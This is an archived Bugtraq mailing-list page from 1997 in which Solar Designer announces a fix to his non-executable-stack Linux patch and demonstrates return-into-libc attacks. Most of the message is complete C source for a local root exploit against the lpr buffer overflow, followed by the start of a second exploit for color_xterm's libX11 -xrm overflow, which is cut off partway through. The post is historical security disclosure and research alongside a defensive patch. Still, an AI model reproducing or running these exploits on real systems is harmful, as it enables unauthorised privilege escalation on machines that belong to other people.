<!-- MHonArc v2.6.16 -->
<!--X-Head-End-->
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="alternate" type="application/rss+xml" title="RSS" href="http://seclists.org/rss/bugtraq.rss">
<title>Bugtraq: Getting around non-executable stack (and fix)</title>
<meta name="Subject" content="Getting around non-executable stack (and fix)">
<meta name="Author" content="Solar Designer">
<link rel="SHORTCUT ICON" href="http://seclists.org/shared/images/tiny-eyeicon.png" type="image/png">
<meta name="ROBOTS" content="NOARCHIVE">
<link rel="stylesheet" href="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/insecdb.css" type="text/css">
<!--Google Analytics-->
<script src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/cse.js" async="" type="text/javascript"></script><script src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/ga.js" async="" type="text/javascript"></script><script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-11009417-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<!--Google Custom Site Search boilerplate Javascript-->
<script>
  (function() {
    var cx = 'partner-pub-0078565546631069:bx60rb-fytx';
    var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
  })();
</script>
<!--End Google Custom Site Search boilerplate Javascript-->

<script type="text/javascript" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/jsapi.js"></script><link rel="stylesheet" href="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/defaulten.css" type="text/css"><link rel="stylesheet" href="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/default.css" type="text/css"><script src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/defaulten.js" type="text/javascript"></script><script src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/search.js" type="text/javascript"></script><style type="text/css">
.gsc-control-cse {
font-family: Arial, sans-serif;
border-color: #2A0D45;
background-color: #FFFFFF;
}
.gsc-control-cse .gsc-table-result {
font-family: Arial, sans-serif;
}
input.gsc-input {
border-color: #D9D9D9;
}
input.gsc-search-button {
border-color: #666666;
background-color: #CECECE;
}
.gsc-tabHeader.gsc-tabhInactive {
border-color: #E9E9E9;
background-color: #E9E9E9;
}
.gsc-tabHeader.gsc-tabhActive {
border-top-color: #FF9900;
border-left-color: #E9E9E9;
border-right-color: #E9E9E9;
background-color: #FFFFFF;
}
.gsc-tabsArea {
border-color: #E9E9E9;
}
.gsc-webResult.gsc-result,
.gsc-results .gsc-imageResult {
border-color: #FFFFFF;
background-color: #FFFFFF;
}
.gsc-webResult.gsc-result:hover,
.gsc-imageResult:hover {
border-color: #FFFFFF;
background-color: #FFFFFF;
}
.gsc-webResult.gsc-result.gsc-promotion:hover {
border-color: #FFFFFF;
background-color: #FFFFFF;
}
.gs-webResult.gs-result a.gs-title:link,
.gs-webResult.gs-result a.gs-title:link b,
.gs-imageResult a.gs-title:link,
.gs-imageResult a.gs-title:link b {
color: #0000FF;
}
.gs-webResult.gs-result a.gs-title:visited,
.gs-webResult.gs-result a.gs-title:visited b,
.gs-imageResult a.gs-title:visited,
.gs-imageResult a.gs-title:visited b {
color: #663399;
}
.gs-webResult.gs-result a.gs-title:hover,
.gs-webResult.gs-result a.gs-title:hover b,
.gs-imageResult a.gs-title:hover,
.gs-imageResult a.gs-title:hover b {
color: #0000CC;
}
.gs-webResult.gs-result a.gs-title:active,
.gs-webResult.gs-result a.gs-title:active b,
.gs-imageResult a.gs-title:active,
.gs-imageResult a.gs-title:active b {
color: #0000CC;
}
.gsc-cursor-page {
color: #0000FF;
}
a.gsc-trailing-more-results:link {
color: #0000FF;
}
.gs-webResult .gs-snippet,
.gs-imageResult .gs-snippet,
.gs-fileFormatType {
color: #000000;
}
.gs-webResult div.gs-visibleUrl,
.gs-imageResult div.gs-visibleUrl {
color: #008000;
}
.gs-webResult div.gs-visibleUrl-short {
color: #008000;
}
.gs-webResult div.gs-visibleUrl-short {
display: none;
}
.gs-webResult div.gs-visibleUrl-long {
display: block;
}
.gs-promotion div.gs-visibleUrl-short {
display: none;
}
.gs-promotion div.gs-visibleUrl-long {
display: block;
}
.gsc-cursor-box {
border-color: #FFFFFF;
}
.gsc-results .gsc-cursor-box .gsc-cursor-page {
border-color: #E9E9E9;
background-color: #FFFFFF;
color: #0000FF;
}
.gsc-results .gsc-cursor-box .gsc-cursor-current-page {
border-color: #FF9900;
background-color: #FFFFFF;
color: #663399;
}
.gsc-webResult.gsc-result.gsc-promotion {
border-color: #336699;
background-color: #FFFFFF;
}
.gsc-completion-title {
color: #0000FF;
}
.gsc-completion-snippet {
color: #000000;
}
.gs-promotion a.gs-title:link,
.gs-promotion a.gs-title:link *,
.gs-promotion .gs-snippet a:link {
color: #0000CC;
}
.gs-promotion a.gs-title:visited,
.gs-promotion a.gs-title:visited *,
.gs-promotion .gs-snippet a:visited {
color: #0000CC;
}
.gs-promotion a.gs-title:hover,
.gs-promotion a.gs-title:hover *,
.gs-promotion .gs-snippet a:hover {
color: #0000CC;
}
.gs-promotion a.gs-title:active,
.gs-promotion a.gs-title:active *,
.gs-promotion .gs-snippet a:active {
color: #0000CC;
}
.gs-promotion .gs-snippet,
.gs-promotion .gs-title .gs-promotion-title-right,
.gs-promotion .gs-title .gs-promotion-title-right * {
color: #000000;
}
.gs-promotion .gs-visibleUrl,
.gs-promotion .gs-visibleUrl-short {
color: #008000;
}
</style><style type="text/css">.gscb_a{display:inline-block;font:27px/13px arial,sans-serif}.gsst_a .gscb_a{color:#a1b9ed;cursor:pointer}.gsst_a:hover .gscb_a,.gsst_a:focus .gscb_a{color:#36c}.gsst_a{display:inline-block}.gsst_a{cursor:pointer;padding:0 4px}.gsst_a:hover{text-decoration:none!important}.gsst_b{font-size:16px;padding:0 2px;position:relative;user-select:none;-moz-user-select:none;white-space:nowrap}.gsst_e{opacity:0.55;}.gsst_a:hover .gsst_e,.gsst_a:focus .gsst_e{opacity:0.72;}.gsst_a:active .gsst_e{opacity:1;}.gsst_f{background:white;text-align:left}.gsst_g{background-color:white;border:1px solid #ccc;border-top-color:#d9d9d9;box-shadow:0 2px 4px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 4px rgba(0,0,0,0.2);margin:-1px -3px;padding:0 6px}.gsst_h{background-color:white;height:1px;margin-bottom:-1px;position:relative;top:-1px}.gsib_a{width:100%;padding:4px 6px 0}.gsib_a,.gsib_b{vertical-align:top}.gssb_c{border:0;position:absolute;z-index:989}.gssb_e{border:1px solid #ccc;border-top-color:#d9d9d9;box-shadow:0 2px 4px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 4px rgba(0,0,0,0.2);cursor:default}.gssb_f{visibility:hidden;white-space:nowrap}.gssb_k{border:0;display:block;position:absolute;top:0;z-index:988}.gsdd_a{border:none!important}.gsq_a{padding:0}.gscsep_a{display:none}.gssb_a{padding:0 7px}.gssb_a,.gssb_a td{white-space:nowrap;overflow:hidden;line-height:22px}#gssb_b{font-size:11px;color:#36c;text-decoration:none}#gssb_b:hover{font-size:11px;color:#36c;text-decoration:underline}.gssb_g{text-align:center;padding:8px 0 7px;position:relative}.gssb_h{font-size:15px;height:28px;margin:0.2em}.gssb_i{background:#eee}.gss_ifl{visibility:hidden;padding-left:5px}.gssb_i .gss_ifl{visibility:visible}a.gssb_j{font-size:13px;color:#36c;text-decoration:none;line-height:100%}a.gssb_j:hover{text-decoration:underline}.gssb_l{height:1px;background-color:#e5e5e5}.gssb_m{color:#000;background:#fff}.gsfe_a{border:1px solid #b9b9b9;border-top-color:#a0a0a0;box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);}.gsfe_b{border:1px solid #4d90fe;outline:none;box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);}.gssb_a{padding:0 7px}.gssb_e{border:0}.gssb_l{margin:5px 0}.gssb_c .gsc-completion-container{position:static}.gssb_c{z-index:5000}.gsc-completion-container table{background:transparent;font-size:inherit;font-family:inherit}.gssb_c > tbody > tr,.gssb_c > tbody > tr > td,.gssb_d,.gssb_d > tbody > tr,.gssb_d > tbody > tr > td,.gssb_e,.gssb_e > tbody > tr,.gssb_e > tbody > tr > td{padding:0;margin:0;border:0}.gssb_a table,.gssb_a table tr,.gssb_a table tr td{padding:0;margin:0;border:0}</style></head>
<body bgcolor="#2A0D45" text="#000000">

<table cellpadding="0" cellspacing="0" width="100%">
<tbody><tr><td align="left"><a href="http://seclists.org/"><img alt="Home page logo" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/sitelogo.png" border="0" height="90" width="168"></a></td>
<td align="right" valign="bottom">
<!-- Begin TopBanner Code -->
<!-- AdSpeed.com Serving Code 7.9.5 for [Zone] TopBanner [Any Dimension] -->
<script type="text/javascript" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/ad.js"></script><a href="http://g.adspeed.net/ad.php?do=clk&amp;aid=202371&amp;zid=14678&amp;t=1402154158&amp;auth=f3654334087202c08ec6d7a82fdef01d" target="_top"><img style="border:0px;" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/20140530-USM-Vuln-Mgmt-728x90.png" height="90" width="728"></a><div style="position:absolute;left:0px;top:0px;visibility:hidden;"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/ad.gif" alt="i" height="1" width="1"></div>
<!-- AdSpeed.com End -->
<!-- End Banner Code -->

</td></tr></tbody></table>
<table cellpadding="0" cellspacing="0" width="100%"><tbody><tr>
<td class="sidebar" align="left" valign="top" width="130">

<!-- SECWIKI PORTAL INSERT -->

<ul>
<li><a href="http://nmap.org/">Nmap Security Scanner</a>
<ul>
<li><a href="http://nmap.org/">Intro</a></li>
<li><a href="http://nmap.org/book/man.html">Ref Guide</a></li>
<li><a href="http://nmap.org/book/install.html">Install Guide</a></li>
<li><a href="http://nmap.org/download.html">Download</a></li>
<li><a href="http://nmap.org/changelog.html">Changelog</a></li>
<li><a href="http://nmap.org/book/">Book</a></li>
<li><a href="http://nmap.org/docs.html">Docs</a></li>
</ul>
</li><li><a href="http://seclists.org/">Security Lists</a>
<ul>
<li><a href="http://seclists.org/nmap-hackers/">Nmap Hackers</a></li>
<li><a href="http://seclists.org/nmap-dev/">Nmap Dev</a></li>
<li><a href="http://seclists.org/bugtraq/">Bugtraq</a></li>
<li><a href="http://seclists.org/fulldisclosure/">Full Disclosure</a></li>
<li><a href="http://seclists.org/pen-test/">Pen Test</a></li>
<li><a href="http://seclists.org/basics/">Basics</a></li>
<li><a href="http://seclists.org/">More</a></li>
</ul>
</li><li><a href="http://sectools.org/">Security Tools</a>
<ul>
<li><a href="http://sectools.org/tag/crackers/">Pass crackers</a></li>
<li><a href="http://sectools.org/tag/sniffers/">Sniffers</a></li>
<li><a href="http://sectools.org/tag/vuln-scanners/">Vuln Scanners</a></li>
<li><a href="http://sectools.org/tag/web-scanners/">Web scanners</a></li>
<li><a href="http://sectools.org/tag/wireless/">Wireless</a></li>
<li><a href="http://sectools.org/tag/sploits/">Exploitation</a></li>
<li><a href="http://sectools.org/tag/packet-crafters/">Packet crafters</a></li>
<li><a href="http://sectools.org/">More</a></li>
</ul>
</li><li><a href="http://insecure.org/">Site News</a></li>
<li><a href="http://insecure.org/advertising.html">Advertising</a></li>
<li><a href="http://insecure.org/fyodor/">About/Contact</a></li>
<li>
<!-- SiteSearch Google -->
<form action="http://insecure.org/search.html" id="cse-search-box-sidebar">
  <div>
    <input name="cx" value="partner-pub-0078565546631069:bx60rb-fytx" type="hidden">
    <input name="cof" value="FORID:9" type="hidden">
    <input name="ie" value="ISO-8859-1" type="hidden">
    <input name="q" size="16" type="text">
    <input name="sa" value="Site Search" type="submit">
  </div>
</form>
<!-- End SiteSearch Google -->
</li>
<!-- These can come back if I ever update them ...
<li><a href="http://insecure.org/links.html">Exceptional Links</a></li>
<li><a href="http://insecure.org/reading.html">Good Reading</a></li>
<li><a href="http://insecure.org/sploits.html">Exploit World</a></li>
-->
<li><a href="http://insecure.org/advertising.html">Sponsors:</a>

<!-- Begin Sidebar 1 Banner Code -->
<!-- Modified random image selection code -- original version at
     http://www.bravenet.com/reviews/archives/tips.php?view=8 -->
<script language="JavaScript">
<!--
var imagenumber = 2;
var randomnumber = Math.random() ;
var rand1 = Math.round( (imagenumber-1) * randomnumber) + 1 ;
images = new Array
images[1] = "/shared/images/p/Acunetix/120x90_Scanner.gif"
images[2] = "/shared/images/p/Acunetix/120x90freexss.gif"

links = new Array
links[1] = "http://www.acunetix.com/vulnerability-scanner/download.htm"
links[2] = "http://www.acunetix.com/cross-site-scripting/scanner.htm"

var myimage = images[rand1]
var mylink = links[rand1]
document.write('<A HREF="' + mylink + '"><IMG src="' + myimage + '" BORDER=0 ALT="Acunetix" WIDTH=120 HEIGHT=90></A>')
//  -->
</script><a href="http://www.acunetix.com/cross-site-scripting/scanner.htm"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/120x90freexss.gif" alt="Acunetix" border="0" height="90" width="120"></a>
<noscript>
<A HREF="http://www.acunetix.com/vulnerability-scanner/download.htm"><IMG SRC="/shared/images/p/Acunetix/120x90_Scanner.gif" BORDER=0 HEIGHT=90 WIDTH=120 ALT="Acunetix"></A>
</noscript>

<!-- End Sidebar 1 Banner Code -->

<br><br>

<!-- Begin Sidebar 2 Banner Code -->
<!-- Modified random image selection code -- original version at
     http://www.bravenet.com/reviews/archives/tips.php?view=8 -->
<script language="JavaScript">
<!--
var imagenumber = 2;
var randomnumber = Math.random() ;
var rand1 = Math.round( (imagenumber-1) * randomnumber) + 1 ;
images = new Array
images[1] = "/shared/images/p/mavituna/scan4xsql_oranga_120x90.gif"
images[2] = "/shared/images/p/mavituna/hackattack_orange_120_90.gif"

links = new Array
links[1] = "https://www.mavitunasecurity.com/netsparker-trial-download/detect-web-application-security-vulnerabilities/?utm_source=insecure&utm_medium=banner&utm_campaign=scan4xsql"
links[2] = "https://www.mavitunasecurity.com/netsparker-trial-download/web-application-security-holes-xss-sql-injection/?utm_source=insecure&utm_medium=banner&utm_campaign=hackattack"

var myimage = images[rand1]
var mylink = links[rand1]
document.write('<A HREF="' + mylink + '"><IMG src="' + myimage + '" BORDER=0 ALT="Acunetix" WIDTH=120 HEIGHT=90></A>')
//  -->
</script><a href="https://www.mavitunasecurity.com/netsparker-trial-download/web-application-security-holes-xss-sql-injection/?utm_source=insecure&amp;utm_medium=banner&amp;utm_campaign=hackattack"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/hackattack_orange_120_90.gif" alt="Acunetix" border="0" height="90" width="120"></a>
<noscript>
<A HREF="https://www.mavitunasecurity.com/netsparker-trial-download/detect-web-application-security-vulnerabilities/?utm_source=insecure&utm_medium=banner&utm_campaign=scan4xsql"><IMG SRC="/shared/images/p/mavituna/scan4xsql_oranga_120x90.gif" BORDER=0 HEIGHT=90 WIDTH=120 ALT="Mavituna Security"></A>
</noscript>

<!-- End Sidebar 2 Banner Code -->

<br><br>


</li></ul></td>
<td align="left" bgcolor="#FFFFFF" valign="top"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/topleftcurve.gif" alt="/"><table style="table-layout: fixed;" cellpadding="4" width="100%"><tbody><tr><td bgcolor="#FFFFFF">

<!--X-Body-Begin-->
<!--X-User-Header-->
<p>
<a href="http://seclists.org/bugtraq/"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/bugtraq-logo.png" style="vertical-align: middle" alt="bugtraq logo" border="0" width="80"></a>
<font size="+1"><a href="http://seclists.org/bugtraq/">Bugtraq</a>
mailing list archives</font><br>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<!-- Google Custom SiteSearch -->
</p><form action="http://insecure.org/search.html" id="top-search-box">
<a href="http://seclists.org/bugtraq/1997/Aug/67"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/left-icon-16x16.png" border="0" height="16" width="16"></a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/date.html#63">By Date</a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/68"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/right-icon-16x16.png" border="0" height="16" width="16"></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="http://seclists.org/bugtraq/1997/Aug/71"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/left-icon-16x16.png" border="0" height="16" width="16"></a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/index.html#63">By Thread</a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/55"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/right-icon-16x16.png" border="0" height="16" width="16"></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <input name="cx" value="partner-pub-0078565546631069:bx60rb-fytx" type="hidden">
    <input name="cof" value="FORID:9" type="hidden">
    <input name="ie" value="ISO-8859-1" type="hidden">
    <input style="background: url(&quot;http://www.google.com/cse/intl/en/images/google_custom_search_watermark.gif&quot;) no-repeat scroll left center rgb(255, 255, 255);" name="q" size="24" type="text">
    <input name="sa" value="Search" type="submit">
<input value="seclists.org/bugtraq/1997/Aug/63" name="siteurl" type="hidden"><input name="ref" type="hidden"><input name="ss" type="hidden"></form>
<script type="text/javascript" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/brand.js"></script>
<!-- End Google Custom SiteSearch -->
<p></p>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<font size="+2"><b>Getting around non-executable stack (and fix)</b></font>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: solar () FALSE COM (Solar Designer)<br>

<em>Date</em>: Sun, 10 Aug 1997 17:29:46 -0300<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
Hello!

I finally decided to post a return-into-libc overflow exploit. This method
has been discussed on linux-kernel list a few months ago (special thanks to
Pavel Machek), but there was still no exploit. I'll start by speaking about
the fix, you can find the exploits (local only) below.

[ I recommend that you read the entire message even if you aren't running
Linux since a lot of the things described here are applicable to other
systems as well (perhaps someone will finally exploit those overflows in
Digital UNIX discussed here last year?). Also, this method might sometimes
be better than usual one (with shellcode) even if the stack is executable. ]

You can find the fixed version of my non-executable stack Linux kernel patch
at <a rel="nofollow" href="http://www.false.com/security/linux-stack/">http://www.false.com/security/linux-stack/</a>.

The problem is fixed by changing the address shared libraries are mmap()ed
at in such a way so it always contains a zero byte. With most vulnerabilities
the overflow is done with an ASCIIZ string, so this prevents the attacker
from passing parameters to the function, and from filling the buffer with
a pattern (requires to know the exact offset of the return address). I admit
someone might still find a libc function with no parameters (this also has
to be a single function, you can't call several of them in a row) that does
enough harm, and find the exact offset of the return address. However, this
gets quite complicated, especially for remote exploits, and especially for
those where you have to guess from the first try (and you also need to guess
the address in libc). So, like before, fix known vulnerabilities, and use
the patch to add an extra layer of security against those yet unknown.

I also fixed a bug with the binary header flag which allowed local users to
bypass the patch. Thanks to retch for reporting.

And one more good thing: I added a symlink-in-/tmp fix, originally by Andrew
Tridgell. I changed it to prevent from using hard links too, by simply not
allowing non-root users to create hard links to files they don't own, in +t
directories. This seems to be the desired behavior anyway, since otherwise
users couldn't remove such links they just created. I also added exploit
attempt logging, this code is shared with the non-executable stack stuff,
and was the reason to make it a single patch instead of two separate ones.
You can enable them separately anyway.

And now here goes the exploit for the well-known old overflow in lpr. This
one is simple, so it looks like a good starting point. Note: it doesn't
contain any assembly code, there's only a NOP opcode, but this one will
most likely not be used, it's for the case when system() is occasionally
at a 256 byte boundary. The exploit also doesn't have any fixed addresses.
Be sure to read comments in the exploit before you look at the next one.

</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- lpr.c --&lt;
</pre></blockquote><pre style="margin: 0em;">
/*
 * /usr/bin/lpr buffer overflow exploit for Linux with non-executable stack
 * Copyright (c) 1997 by Solar Designer
 */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;setjmp.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;

#define SIZE            1200    /* Amount of data to overflow with */
#define ALIGNMENT       11      /* 0, 8, 1..3, 9..11 */

#define ADDR_MASK       0xFF000000

char buf[SIZE];
int *ptr;

int pid, pc, shell, step;
int started = 0;
jmp_buf env;

void handler() {
  started++;
}

/* SIGSEGV handler, to search in libc */
void fault() {
  if (step &lt; 0) {
/* Change the search direction */
    longjmp(env, 1);
  } else {
/* The search failed in both directions */
    puts("\"/bin/sh\" not found, bad luck");
    exit(1);
  }
}

void error(char *fn) {
  perror(fn);
  if (pid &gt; 0) kill(pid, SIGKILL);
  exit(1);
}

void main() {
  signal(SIGUSR1, handler);

/* Create a child process to trace */
  if ((pid = fork()) &lt; 0) error("fork");

  if (!pid) {
/* Send the parent a signal, so it starts tracing */
    kill(getppid(), SIGUSR1);
/* A loop since the parent may not start tracing immediately */
    while (1) system("");
  }

/* Wait until the child tells us the next library call will be system() */
  while (!started);

  if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error("PTRACE_ATTACH");

/* Single step the child until it gets out of system() */
  do {
    waitpid(pid, NULL, WUNTRACED);
    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
    if (pc == -1) error("PTRACE_PEEKUSR");
    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
  } while ((pc &amp; ADDR_MASK) != ((int)main &amp; ADDR_MASK));

/* Single step the child until it calls system() again */
  do {
    waitpid(pid, NULL, WUNTRACED);
    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
    if (pc == -1) error("PTRACE_PEEKUSR");
    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
  } while ((pc &amp; ADDR_MASK) == ((int)main &amp; ADDR_MASK));

/* Kill the child, we don't need it any more */
  if (ptrace(PTRACE_KILL, pid, 0, 0)) error("PTRACE_KILL");
  pid = 0;

  printf("system() found at: %08x\n", pc);

/* Let's hope there's an extra NOP if system() is 256 byte aligned */
  if (!(pc &amp; 0xFF))
  if (*(unsigned char *)--pc != 0x90) pc = 0;

/* There's no easy workaround for these (except for using another function) */
  if (!(pc &amp; 0xFF00) || !(pc &amp; 0xFF0000) || !(pc &amp; 0xFF000000)) {
    puts("Zero bytes in address, bad luck");
    exit(1);
  }

/*
 * Search for a "/bin/sh" in libc until we find a copy with no zero bytes
 * in its address. To avoid specifying the actual address that libc is
 * mmap()ed to we search from the address of system() in both directions
 * until a SIGSEGV is generated.
 */
  if (setjmp(env)) step = 1; else step = -1;
  shell = pc;
  signal(SIGSEGV, fault);
  do
    while (memcmp((void *)shell, "/bin/sh", 8)) shell += step;
  while (!(shell &amp; 0xFF) || !(shell &amp; 0xFF00) || !(shell &amp; 0xFF0000));
  signal(SIGSEGV, SIG_DFL);

  printf("\"/bin/sh\" found at: %08x\n", shell);

/*
 * When returning into system() the stack should look like:
 *                              pointer to "/bin/sh"
 *                              return address placeholder
 * stack pointer -&gt;             pointer to system()
 *
 * The buffer could be filled with this 12 byte pattern, but then we would
 * need to try up to 12 values for the alignment. That's why a 16 byte pattern
 * is used instead:
 *                              pointer to "/bin/sh"
 *                              pointer to "/bin/sh"
 * stack pointer (case 1) -&gt;    pointer to system()
 * stack pointer (case 2) -&gt;    pointer to system()
 *
 * Any of the two stack pointer values will do, and only up to 8 values for
 * the alignment need to be tried.
 */
  memset(buf, 'x', ALIGNMENT);
  ptr = (int *)(buf + ALIGNMENT);
  while ((char *)ptr &lt; buf + SIZE - 4*sizeof(int)) {
    *ptr++ = pc; *ptr++ = pc;
    *ptr++ = shell; *ptr++ = shell;
  }
  buf[SIZE - 1] = 0;

  execl("/usr/bin/lpr", "lpr", "-C", buf, NULL);
  error("execl");
}

</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- lpr.c --&lt;
</pre></blockquote><pre style="margin: 0em;">
The exploit above will crash after you exit the shell. This can be fixed by
using a 12 byte pattern (like described in the comment), and setting the
return address to point to exit() (we would need to find it first). This
would however increase the number of possible alignment values to try from
8 to 12, so I don't do it.

Now, a more complicated exploit, for the -xrm libX11 overflow. It has been
tested with color_xterm from Slackware 3.1. Will also work on other xterms
(tested with xterm and nxterm from RedHat 4.2), but providing a user shell
(not root), since these temporarily give up their privileges, and an extra
setuid() call would be required.

Actually, using this method it is possible to call two functions in a row
if the first one has exactly one parameter. The stack should look like this:

                                pointer to "/bin/sh"
                                pointer to the UID (usually to 0)
                                pointer to system()
 stack pointer -&gt;               pointer to setuid()

This will require up to 16 values for the alignment. In this case, setuid()
will return into system(), and while system() is running the pointer to UID
will be at the place where system()'s return address should normally be, so
(again) the thing will crash after you exit the shell (but no solution this
time; who cares anyway?). I leave this setuid() stuff as an exercise for the
reader.

Another thing specific to this exploit is that GetDatabase() in libX11 uses
its parameter right before returning, so if we overwrite the return address
and a few bytes after it (like normal pattern filling would do), the exploit
wouldn't work. That was the reason the -xrm exploits posted were not stable,
and required to adjust the size exactly. With returning into libc, this was
not possible at all, since parameters to libc function should be right after
the return address. That's why I do a trick similar to my SuperProbe exploit:
overwrite a pointer to a structure that has a function pointer in it (their
function also has exactly one parameter, I was extremely lucky here again).

This trick requires three separate buffers filled with different patterns.
The first buffer is what I overflow with, while the two others are put onto
the stack separately (to make them larger). Again, there's no correct return
address from system(), and a pointer to some place on the stack is there.
This makes it behave quite funny when you exit the shell: an exploit attempt
is logged (when running my patch), since system() returns onto the stack. ;^)
You can just kill the vulnerable program you're running from instead of
exiting the shell if this is undesired.

Note that you have to link the exploit with the same shared libraries that
the vulnerable program. Also, it might be required to add 4 to ALIGNMENT2 if
the exploit doesn't work, even if it worked when running as another user...

</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- cx.c --&lt;
</pre></blockquote><pre style="margin: 0em;">
/*
 * color_xterm buffer overflow exploit for Linux with non-executable stack
 * Copyright (c) 1997 by Solar Designer
 *
 * Compile:
 * gcc cx.c -o cx -L/usr/X11/lib \
 * `ldd /usr/X11/bin/color_xterm | sed -e s/^.lib/-l/ -e s/\\\.so.\\\+//`
 *
 * Run:
 * $ ./cx
 * system() found at: 401553b0
 * "/bin/sh" found at: 401bfa3d
 * bash# exit
 * Segmentation fault
 */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;setjmp.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;

#define SIZE1           1200    /* Amount of data to overflow with */
#define ALIGNMENT1      0       /* 0..3 */
#define OFFSET          22000   /* Structure array offset */
#define SIZE2           16000   /* Structure array size */
#define ALIGNMENT2      5       /* 0, 4, 1..3, 5..7 */
#define SIZE3           SIZE2
#define ALIGNMENT3      (ALIGNMENT2 &amp; 3)

#define ADDR_MASK       0xFF000000

char buf1[SIZE1], buf2[SIZE2 + SIZE3], *buf3 = &amp;buf2[SIZE2];
int *ptr;

int pid, pc, shell, step;
int started = 0;
jmp_buf env;

void handler() {
  started++;
}

/* SIGSEGV handler, to search in libc */
void fault() {
  if (step &lt; 0) {
/* Change the search direction */
    longjmp(env, 1);
  } else {
/* The search failed in both directions */
    puts("\"/bin/sh\" not found, bad luck");
    exit(1);
  }
}

void error(char *fn) {
  perror(fn);
  if (pid &gt; 0) kill(pid, SIGKILL);
  exit(1);
}

int nz(int value) {
  if (!(value &amp; 0xFF)) value |= 8;
  if (!(value &amp; 0xFF00)) value |= 0x100;

  return value;
}

void main() {
/*
 * A portable way to get the stack pointer value; why do other exploits use
 * an assembly instruction here?!
 */
  int sp = (int)&amp;sp;

  signal(SIGUSR1, handler);

/* Create a child process to trace */
  if ((pid = fork()) &lt; 0) error("fork");

  if (!pid) {
/* Send the parent a signal, so it starts tracing */
    kill(getppid(), SIGUSR1);
/* A loop since the parent may not start tracing immediately */
    while (1) system("");
  }

